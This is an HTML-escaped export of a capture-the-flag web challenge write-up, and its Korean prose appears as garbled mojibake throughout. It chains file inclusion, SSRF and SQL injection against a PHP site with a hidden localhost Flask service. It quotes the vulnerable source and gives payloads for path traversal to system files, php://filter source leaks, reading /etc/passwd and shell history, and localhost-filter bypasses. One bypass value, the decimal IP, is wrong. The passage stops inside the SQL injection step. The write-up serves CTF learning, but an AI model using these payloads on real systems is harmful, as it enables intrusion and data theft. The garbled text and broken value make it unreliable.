id=&quot;0bfba01f-16c2-47f8-a338-3646111d5876&quot;/&gt;&lt;figure id=&quot;9f0ff2df-a367-4f41-b550-8d9a0987de82&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob923.png&quot;&gt;&lt;img style=&quot;width:789px&quot; src=&quot;/assets/bob/bob923.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;d214b0a9-8fe1-4454-900f-ed2e5a0008ee&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;lfi + sqli + ssrf
descriptionì˜ catì€ php, dogì€ python flaskë¥¼ ì˜ë¯¸í•œë‹¤.

8888í¬íŠ¸ë¡œ ëŒê³  ìˆëŠ” phpëŠ” flag íŒŒì¼ì˜ read ê¶Œí•œì´ ì—†ê¸° ë•Œë¬¸ì— ë‚´ë¶€ì—ì„œ ëŒê³  ìˆëŠ” flaskë¥¼ ì´ìš©í•˜ì—¬ flag íŒŒì¼ì„ ì½ì–´ì˜¤ëŠ” ê²ƒì´ ëª©í‘œì„.
ì´ flask ì„œë²„ëŠ” localhostë§Œ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤.

ì›¹ì„œë²„ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ê°€ì§€ëŠ” &amp;#x27;www-data&amp;#x27; ê¶Œí•œì´ ì•„ë‹Œ &amp;#x27;php&amp;#x27; ìœ ì €ë¡œ ëŒì•„ê°„ë‹¤ëŠ” ì„¤ëª…ì´ flask í¬íŠ¸ë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” íŒíŠ¸ì„.

lfië¥¼ í†µí•´ flask í¬íŠ¸ë¥¼ ì•Œì•„ë‚¸ í›„ ssrfë¥¼ ì´ìš©í•˜ì—¬ flask ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ë©´ /flag pathì—ì„œ passcodeë¥¼ ìš”êµ¬í•œë‹¤. ì´ passcodeëŠ” sqlië¥¼ ì´ìš©í•˜ì—¬ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤.

/flag?passcode=@@@@ì™€ ê°™ì´ passcodeë¥¼ ì…ë ¥í•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;140131f8-4dbc-4c9b-8304-8a833cf68d69&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;74063420-0d24-481d-a0e9-b9e94799b939&quot; class=&quot;&quot;&gt;1. index.php ì†ŒìŠ¤ì½”ë“œ ì¶”ì¶œ + lfi ì·¨ì•½ì &lt;/h3&gt;&lt;figure id=&quot;96f7b2ef-b376-4d30-b39d-fc86fb76336c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob924.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob924.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;9c78ce62-3c7f-471e-a960-bc8e1d0bd87e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob925.png&quot;&gt;&lt;img style=&quot;width:656px&quot; src=&quot;/assets/bob/bob925.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;0ffebfd3-e925-405c-8cd8-643704ff79a8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë©”ì¸í˜ì´ì§€ì—ì„œ view-sourceë¥¼ í•˜ë©´ 68ë²ˆì§¸ ë¼ì¸ì— ì£¼ì„ìœ¼ë¡œ &lt;code&gt;index.php/?source&lt;/code&gt; ê°€ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;23701e6a-6273-4496-bcae-68db4dd77e54&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;?php
    include_once &amp;quot;header.php&amp;quot;;
    include_once &amp;quot;config.php&amp;quot;;
    if(isset($_GET[&amp;#x27;source&amp;#x27;])){
        echo &amp;quot;&amp;lt;div style=&amp;#x27;margin-top: 6rem;&amp;#x27;/&amp;gt;&amp;quot;;
        highlight_file(__FILE__);
        die();
    }
    
    $page = $_GET[&amp;quot;page&amp;quot;];
    if(isset($page) and is_string($page)){
        if(preg_match(&amp;quot;/.php/&amp;quot;, $page) === 0){
            $page .= &amp;quot;.php&amp;quot;;
        }

        if(preg_match(&amp;quot;/(login|register)/&amp;quot;, $page) === 0 &amp;amp;&amp;amp; $_SESSION[&amp;quot;username&amp;quot;] == null){
            echo &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Please Login!&amp;#x27;);location.href=&amp;#x27;/?page=login&amp;#x27;;&amp;lt;/script&amp;gt;&amp;quot;;
            die();
        }
        include $page;
        die();
    }
?&amp;gt;
&amp;lt;!-- index.php/?source --&amp;gt;
&amp;lt;div style=&amp;quot;position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);&amp;quot;&amp;gt;
    &amp;lt;div&amp;gt;
        &amp;lt;img src=&amp;quot;/images/bg.jpg&amp;quot; style=&amp;quot;width: 100%; height: 80vh; object-fit: cover; opacity: 0.5&amp;quot;/&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;div style=&amp;quot;display: flex; justify-content: center;&amp;quot;&amp;gt;
        &amp;lt;div style=&amp;quot;font-size: 4rem;&amp;quot;&amp;gt;
            meow
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;cebaafc4-47d7-4312-a469-0bafd1728f8f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;index.php/?source&lt;/code&gt; ì— ì ‘ê·¼í•˜ë©´ &lt;code&gt;index.php&lt;/code&gt; ì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d2819eb9-3e46-427d-b39a-fd54f9be0574&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;$page&lt;/code&gt; íŒŒë¼ë¯¸í„°ë¥¼ includeí•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ lfi ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;48caa50a-8a79-473f-90f4-4cfe93fbd38a&quot; class=&quot;code&quot;&gt;&lt;code&gt;        if(preg_match(&amp;quot;/.php/&amp;quot;, $page) === 0){
            $page .= &amp;quot;.php&amp;quot;;
        }&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;ebfe6de9-0c8a-4603-bef5-506c93e4ae20&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;$page&lt;/code&gt; íŒŒë¼ë¯¸í„°ì— &lt;code&gt;.php&lt;/code&gt; ê°€ ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš° ë§ˆì§€ë§‰ì— &lt;code&gt;.php&lt;/code&gt; ë¥¼ ì¶”ê°€í•˜ëŠ” ì½”ë“œê°€ ìˆì§€ë§Œ, í•´ë‹¹ ì •ê·œí‘œí˜„ì‹ì€ &lt;code&gt;.php&lt;/code&gt; ê°€ ì¡´ì¬í•˜ê¸°ë§Œ í•œë‹¤ë©´ ìš°íšŒê°€ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;0304f172-07ff-4557-9836-8799aae8d992&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë”°ë¼ì„œ &lt;code&gt;/?page=/.php/../../../../../../etc/issue&lt;/code&gt; ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ í†µí•´ file leakì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d28bcadf-caf9-461a-b5c6-b15360d7816b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë˜í•œ, &lt;code&gt;/?page=php://filter/convert.base64-encode/resource=articles&lt;/code&gt; ì™€ ê°™ì´  php wrapperë¥¼ ì´ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ì— ì¡´ì¬í•˜ëŠ” php ì†ŒìŠ¤ì½”ë“œë¥¼ ëª¨ë‘ leakí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;9f15f7ed-978b-471c-bb9a-cef417704345&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;d76249b1-b72f-4e85-bce1-864bb6a0a5e0&quot; class=&quot;&quot;&gt;2. ssrf ì·¨ì•½ì &lt;/h3&gt;&lt;figure id=&quot;3914f05c-5776-4b1b-a8e3-8d438896a9a8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob926.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob926.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;5e799b36-2bc0-498c-bbab-dc059ade9027&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ìŒìœ¼ë¡œ articlesë¥¼ ë³´ë©´ ê¸€ ì‘ì„± ì‹œ ì´ë¯¸ì§€ê°€ ìë™ìœ¼ë¡œ ì²¨ë¶€ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆëŠ”ë°, ì´ ì´ë¯¸ì§€ë¥¼ mypageì—ì„œ ë³€ê²½í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;f75568c7-603a-494d-93fd-8370f3202245&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob927.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob927.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;pre id=&quot;5a04937e-cd90-4f1d-8087-6d975759cc1d&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;!-- ... --&amp;gt;

&amp;lt;?php
    if(isset($_POST[&amp;quot;type&amp;quot;])){
        sleep(3);
        $url = trim($_POST[&amp;quot;url&amp;quot;]);

        if(preg_match(&amp;quot;/^(http\:\/\/|https\:\/\/)/&amp;quot;, $url) === 0 || preg_match(&amp;quot;/(127\.0\.0\.1|localhost)/&amp;quot;, $url) === 1){
            echo(&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Don\&amp;#x27;t hack!&amp;#x27;);location.href=&amp;#x27;/?page=mypage&amp;#x27;;&amp;lt;/script&amp;gt;&amp;quot;);
            die();
        }

        if(!isset($url) || $url == &amp;quot;&amp;quot;){
            echo(&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Enter the image URL!&amp;#x27;);location.href=&amp;#x27;/?page=mypage&amp;#x27;;&amp;lt;/script&amp;gt;&amp;quot;);
            die();
        }

        if($_POST[&amp;quot;type&amp;quot;] === &amp;quot;p&amp;quot;){
            $data = base64_encode(file_get_contents($url));
            $src = &amp;quot;data: png;base64,${data}&amp;quot;;
            echo &amp;quot;&amp;lt;img src=&amp;#x27;${src}&amp;#x27; style=&amp;#x27;height: 40vh; width: 100%; object-fit: cover;&amp;#x27;/&amp;gt;&amp;quot;;
        }

        else if($_POST[&amp;quot;type&amp;quot;] === &amp;quot;o&amp;quot;){
            $stmt = $sql-&amp;gt;prepare(&amp;quot;update user set img = ? where username = ?&amp;quot;);
            $stmt-&amp;gt;bind_param(&amp;#x27;ss&amp;#x27;, $url, $_SESSION[&amp;quot;username&amp;quot;]);
            $stmt-&amp;gt;execute();
        
            $result = $stmt-&amp;gt;get_result();
            echo &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Complete.&amp;#x27;);location.href=&amp;#x27;/?page=articles&amp;#x27;&amp;lt;/script&amp;gt;&amp;quot;;
        }
    }
?&amp;gt;

&amp;lt;!-- ... --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;a2abf4a1-103b-4413-81e3-0f071929521d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;mypageì˜ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ previewë¥¼ ëˆŒë €ì„ ë•Œ &lt;code&gt;file_get_contents&lt;/code&gt; ë¥¼ ì´ìš©í•˜ì—¬ &lt;code&gt;url&lt;/code&gt; ì˜ ê°’ì„ ê°€ì ¸ì˜¨ í›„ base64ë¡œ ì¸ì½”ë”©í•˜ì—¬ ì´ë¯¸ì§€ë¥¼ ë³´ì—¬ì¤€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;5982d2c4-5f1a-499c-a09e-f38047a319c5&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ ë•Œ &lt;code&gt;file_get_contents&lt;/code&gt; ë¥¼ ì´ìš©í•œ file leakì„ ë°©ì§€í•˜ê¸° ìœ„í•´ &lt;code&gt;http/https scheme&lt;/code&gt; ë¥¼ ê°•ì œí•˜ì˜€ìœ¼ë©°, &lt;code&gt;localhost&lt;/code&gt; ì™€ &lt;code&gt;127.0.0.1&lt;/code&gt; ì˜ ê°’ì„ ë§‰ì•„ë‘ì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;127581ce-4dd5-4a0a-ba44-18dfb1da28dc&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì—¬ê¸°ì„œ ë„ë©”ì¸ì„ &lt;code&gt;localhost&lt;/code&gt; ì™€ &lt;code&gt;127.0.0.1&lt;/code&gt; ëŒ€ì‹  &lt;code&gt;http://0&lt;/code&gt; ì´ë‚˜ 10ì§„ìˆ˜ í‘œí˜„ &lt;code&gt;http://213070643&lt;/code&gt; ë˜ëŠ” 16ì§„ìˆ˜ í‘œí˜„ &lt;code&gt;http://0x7F000001&lt;/code&gt; ë“±ì„ ì‚¬ìš©í•˜ì—¬ ìš°íšŒí•˜ë©´ ssrf ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;ec4dfd72-dd3a-4822-aa1b-853c2c8a3bc3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;2fb72a82-082d-4118-ad62-ea24566e5749&quot; class=&quot;&quot;&gt;3. íŒíŠ¸&lt;/h3&gt;&lt;figure id=&quot;a287569b-7e04-4e28-a54f-e64decd85408&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob928.png&quot;&gt;&lt;img style=&quot;width:790px&quot; src=&quot;/assets/bob/bob928.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;ee58e01a-d4d2-44e0-8d80-ea3da582cbd4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ì‹œ ë¬¸ì œ descriptionì„ ì‚´í´ë³´ë©´ ì£¼ë¨¸ë‹ˆì— &lt;code&gt;ê°œ&lt;/code&gt; ë¥¼ ìˆ¨ê²¨ë‘ì—ˆìœ¼ë©°, í”Œë˜ê·¸ë¥¼ ê°€ì§€ê³  ìˆë‹¤ê³  í•œë‹¤. í˜„ì¬ë¡œì„  ê°œê°€ ì–´ë–¤ &lt;code&gt;ê°œ&lt;/code&gt; ê°€ ì–´ë–¤ ê²ƒì„ ì˜ë¯¸í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ì—†ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;6027ce58-3d1d-409a-962b-3da973491a8e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ìŒìœ¼ë¡œ, í•˜ë‹¨ì˜ ë°•ìŠ¤ë¥¼ í™•ì¸í•´ë³´ë©´ ì›¹ì„œë²„ê°€ &lt;code&gt;www-data&lt;/code&gt; ê°€ ì•„ë‹Œ &lt;code&gt;php&lt;/code&gt; ìœ ì €ë¡œ ëŒê³  ìˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;b9fa9422-6b9b-4366-8ea0-3d08b28b3797&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì›¹ì„œë²„ì˜ ìœ ì €ë¥¼ ë³€ê²½í•˜ì—¬ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ëŠ” íŠ¹ìˆ˜í•œ ê²½ìš°ì´ê¸° ë•Œë¬¸ì—, ì˜ì‹¬í•´ë³¼ ì—¬ì§€ê°€ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;c8eecd34-6053-4c15-8423-23384ca26fa3&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob929.png&quot;&gt;&lt;img style=&quot;width:665px&quot; src=&quot;/assets/bob/bob929.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;f8b7fa8f-5451-4379-99c9-0cda19f7770e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;php ê³„ì •ì— ëŒ€í•œ íŒíŠ¸ë¥¼ ì–»ì—ˆìœ¼ë‹ˆ, lfi ì·¨ì•½ì ì„ ì´ìš©í•´ &lt;code&gt;/etc/passwd&lt;/code&gt; íŒŒì¼ì„ í™•ì¸í•´ë³´ì.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;ac2db54c-e15b-4689-92ff-c15aaad2392c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ íŒŒì¼ì—ëŠ” php ê³„ì •ê³¼ python ê³„ì •ì´ ì¡´ì¬í•˜ë©°, &lt;code&gt;/home/php&lt;/code&gt; ì™€ &lt;code&gt;/home/python&lt;/code&gt; ê°€ í™ˆ ë””ë ‰í† ë¦¬ë¡œ ì§€ì •ë˜ì–´ ìˆë‹¤. ë˜í•œ, ê³„ì • ì ‘ê·¼ ì‹œ &lt;code&gt;/bin/bash&lt;/code&gt; ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ ì‰˜ì„ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;e34d3f50-021a-4e93-89f1-1bf2898a0879&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob930.png&quot;&gt;&lt;img style=&quot;width:747px&quot; src=&quot;/assets/bob/bob930.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;6fb587e7-d867-4c97-8aaa-88f10a406807&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;php&lt;/code&gt; ê³„ì • í™ˆ ë””ë ‰í† ë¦¬ì— ì¡´ì¬í•˜ëŠ” &lt;code&gt;.bash_history&lt;/code&gt; ë¥¼ í™•ì¸í•´ë³´ë©´ &lt;code&gt;localhost&lt;/code&gt; ì˜ 2026 í¬íŠ¸ë¡œ &lt;code&gt;curl&lt;/code&gt; ìš”ì²­ì„ ë‚ ë¦¬ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë¥¼ í†µí•´ ë¬¸ì œ descriptionì˜ &lt;code&gt;ê°œ&lt;/code&gt; ê°€ ì›¹ ì„œë¹„ìŠ¤ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;90d320ad-e008-4597-b167-35b32c998490&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ í¬íŠ¸ì—ì„œ ëŒê³  ìˆëŠ” ì›¹ ì„œë¹„ìŠ¤ëŠ” &lt;code&gt;localhost&lt;/code&gt; ì—ì„œë§Œ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë„ë¡ ì„¤ì •í•˜ì˜€ê¸° ë•Œë¬¸ì—, ì´ì „ì— ë°œê²¬í–ˆë˜ &lt;code&gt;ssrf&lt;/code&gt; ì·¨ì•½ì ì„ í†µí•´ ìš”ì²­ì„ í•´ì•¼ë§Œ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;d9e2b682-d7c4-4e63-a2a1-1d5efbc7ff03&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;7ab844cd-3745-42c0-b53f-66f64a450f5d&quot; class=&quot;&quot;&gt;4. ìˆ¨ê²¨ì§„ ì›¹ ì„œë¹„ìŠ¤(dog) ìš”ì²­&lt;/h3&gt;&lt;figure id=&quot;23a67487-8a05-45cd-8288-ef1223d273ee&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob931.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob931.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;8ac77972-702e-4def-816b-b222ed67330a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;mypage&lt;/code&gt; ì—ì„œ &lt;code&gt;http://0:2026&lt;/code&gt; ìœ¼ë¡œ &lt;code&gt;preview&lt;/code&gt; ë¥¼ ìš”ì²­í•˜ë©´ ì •ìƒì ìœ¼ë¡œ ìš”ì²­ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;4ac1278e-0884-420e-8a55-9088c1a32116&quot; class=&quot;code&quot;&gt;&lt;code&gt;http://0:2026

Well done! Go to /flag&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;4479fd6f-4295-4ba5-b423-a9d81fb750ad&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ë‹¨ì˜ ì´ë¯¸ì§€ë¥¼ &lt;code&gt;ìƒˆ íƒ­ì—ì„œ ì—´ê¸°&lt;/code&gt; ë“±ì„ ì´ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ í™•ì¸í•´ë³´ë©´ &lt;code&gt;localhost&lt;/code&gt; ì˜ 2026 í¬íŠ¸ë¡œ ëŒê³  ìˆëŠ” &lt;code&gt;ì›¹ ì„œë¹„ìŠ¤&lt;/code&gt; ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, &lt;code&gt;/flag&lt;/code&gt; pathë¡œ ì´ë™í•˜ë¼ëŠ” ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;b284f658-0738-44f6-940a-86a97d0de6b0&quot; class=&quot;code&quot;&gt;&lt;code&gt;http://0:2026/flag

Usage : /flag?passcode=
/flag has a delay for 3sec.
Do not bruteforce!&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;d38582b1-e5e7-428d-b47c-7149e0494cdb&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;/flag&lt;/code&gt; pathì— ì ‘ê·¼í•˜ë©´ &lt;code&gt;passcode&lt;/code&gt; ë¥¼ ìš”êµ¬í•œë‹¤. &lt;code&gt;mypage&lt;/code&gt; í˜ì´ì§€ì™€ ë™ì¼í•˜ê²Œ 3ì´ˆì˜ ë”œë ˆì´ë¥¼ ê°€ì§€ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;f51551bc-e8bc-4a70-bffd-f612fc281072&quot; class=&quot;code&quot;&gt;&lt;code&gt;http://0:2026/flag?passcode=1234

Wrong passcode!
Go back to PHP... You can get the passcode in PHP&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;e2a88a0f-a3b0-4139-8ad3-1a0288d2da59&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•„ë¬´ &lt;code&gt;passcode&lt;/code&gt; ë¥¼ ì…ë ¥í•˜ë©´ ìœ„ì™€ ê°™ì€ ì•ˆë‚´ ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚œë‹¤. í˜„ì¬ ì„œë¹„ìŠ¤ì—ì„œ &lt;code&gt;passcode&lt;/code&gt; ë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ê¸° ë•Œë¬¸ì— &lt;code&gt;php&lt;/code&gt; ì„œë¹„ìŠ¤ë¡œ ëŒì•„ê°€ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;3a70cb43-5738-4247-aa40-fcf242b174fc&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;c7b2f78a-6c84-4b79-bda5-330761187836&quot; class=&quot;&quot;&gt;5. sql injection â†’ passcode í™•ì¸&lt;/h3&gt;&lt;figure id=&quot;18684d4d-b130-41d1-ac39-086fb200853c&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob932.png&quot;&gt;&lt;img style=&quot;width:1920px&quot; src=&quot;/assets/bob/bob932.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;6b3a6e29-8ff6-4bef-9894-d6abd360ef27&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;articles.php&lt;/code&gt; í˜ì´ì§€ì˜ ìƒë‹¨ì„ ë³´ë©´ ê²€ìƒ‰ ë°•ìŠ¤ê°€ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;abd70b50-81d5-4b5f-bb6f-007a73910059&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;!-- ... --&amp;gt;

&amp;lt;?php
		  $s = $_GET[&amp;quot;search&amp;quot;];
		  $search = &amp;quot;%${s}%&amp;quot;;
		  
		  $page = $_GET[&amp;quot;p&amp;quot;];
		  if(!isset($page) || $page == &amp;quot;&amp;quot; || !is_numeric($page)){
		      $page = 1;
		  }
		  else{
		      $page = intval($page);
		  }
		  $page -= 1;
		  if($page &amp;lt; 0) $page = 0;
		  $start = $page*10;
		  
		  if(preg_match(&amp;quot;/(\ |\n|\t|\r|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text\&amp;quot;)/i&amp;quot;, $search) === 1){
		      echo &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;Don\&amp;#x27;t hack!&amp;#x27;);history.back();&amp;lt;/script&amp;gt;&amp;quot;;
		      die();
		  }
		  $query = &amp;quot;select id, title, content, author, img from board where title like &amp;#x27;${search}&amp;#x27; or content like &amp;#x27;${search}&amp;#x27; order by id desc limit ${start}, 10&amp;quot;;
		  $result = mysqli_query($sql, $query);
		
			while ($row = mysqli_fetch_array($result)){
					echo &amp;quot;&amp;lt;li onclick=\&amp;quot;location.href=&amp;#x27;/?page=view&amp;amp;id=${row[&amp;#x27;id&amp;#x27;]}&amp;#x27;;\&amp;quot;&amp;gt;&amp;quot;;
					echo &amp;quot;&amp;lt;img src=\&amp;quot;${row[&amp;#x27;img&amp;#x27;]}\&amp;quot; style=\&amp;quot;width: 100%; height: 20vh; object-fit: cover; \&amp;quot;&amp;gt;&amp;quot;;
					echo &amp;#x27;&amp;lt;div class=&amp;quot;post-info&amp;quot;&amp;gt;&amp;#x27;;
					echo &amp;#x27;&amp;lt;div class=&amp;quot;post-basic-info&amp;quot;&amp;gt;&amp;#x27;;
					echo &amp;quot;&amp;lt;h3&amp;gt;&amp;lt;a href=\&amp;quot;#\&amp;quot;&amp;gt;${row[&amp;#x27;title&amp;#x27;]}&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;&amp;quot;;
			              echo &amp;quot;&amp;lt;p&amp;gt;${row[&amp;#x27;content&amp;#x27;]}&amp;lt;/p&amp;gt;&amp;quot;;
			              echo &amp;quot;&amp;lt;span&amp;gt;&amp;lt;a href=\&amp;quot;#\&amp;quot;&amp;gt;Writer: ${row[&amp;#x27;author&amp;#x27;]}&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt;&amp;quot;;
					echo &amp;#x27;&amp;lt;/div&amp;gt;&amp;#x27;;
					echo &amp;#x27;&amp;lt;/div&amp;gt;&amp;#x27;;
					echo &amp;#x27;&amp;lt;/li&amp;gt;&amp;#x27;;
		  }
?&amp;gt;

